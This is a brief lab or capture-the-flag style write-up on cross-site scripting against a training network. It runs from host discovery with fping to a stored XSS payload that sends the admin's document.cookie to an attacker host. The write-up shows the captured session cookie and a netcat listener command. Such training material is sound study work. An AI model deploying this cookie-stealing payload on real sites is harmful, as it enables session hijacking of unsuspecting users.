# Cross site scripting 

> Makayla Ferrell | July 28th, 2021

### Steps 

1. Connect to VPN 
```
sudo openvpn <filename> 
```
2. Find Network IP range 
```
ip a 
```
192.168.99.100/24

3. Find active hosts with fping 
```
fping -a -g 192.168.99.100/24 2>/dev/null 
```
The target is 192.168.99.10

4. Visit site and find vulnerable points.
 Search parameter is vulnerable to relfective 
 Blog comments are sanitized 
 Contact feedback is vulnerable to persistent 


Instead of alert(1) use alert(document.domain)

5. Use given attacker site to steal admin cookie with persistent XSS. 

<script> 
	var i = new Image(); 
	i.src="http://192.168.99.100:1234/get.php?q"+document.cookie; 
	document.body.appendChild(i); #add for modern day 
</script>

6. Visit given attacker file to view stolen cookie: http://192.168.99.11/jar.txt 
192.168.99.100 Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 
qPHPSESSID=o2c8q5r6qfpf4hetju7ph630t7 

7. Can set up a listener to steal the cookie and recieve it as a get request
```
$nc -vlp 1234
``` 